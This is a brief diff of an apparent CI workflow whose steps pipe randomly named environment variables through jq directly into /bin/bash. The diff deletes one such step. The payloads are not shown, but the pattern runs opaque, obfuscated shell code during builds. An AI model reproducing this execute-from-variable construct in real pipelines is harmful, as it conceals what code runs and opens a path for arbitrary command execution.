@@ -26,7 +26,6 @@ jobs:
           echo $d09805 | jq -r .sgzh42324 | /bin/bash
           echo $vaxb0 | jq -r .s2 | /bin/bash
           printf '%s' "$oxrsn8745" | jq -r .bzd946 | /bin/bash
-          printf '%s' "$maqbf707" | jq -r .th6 | /bin/bash
           printf '%s' "$vk0870" | jq -r .afzek344 | /bin/bash
 
       - name: Upload output
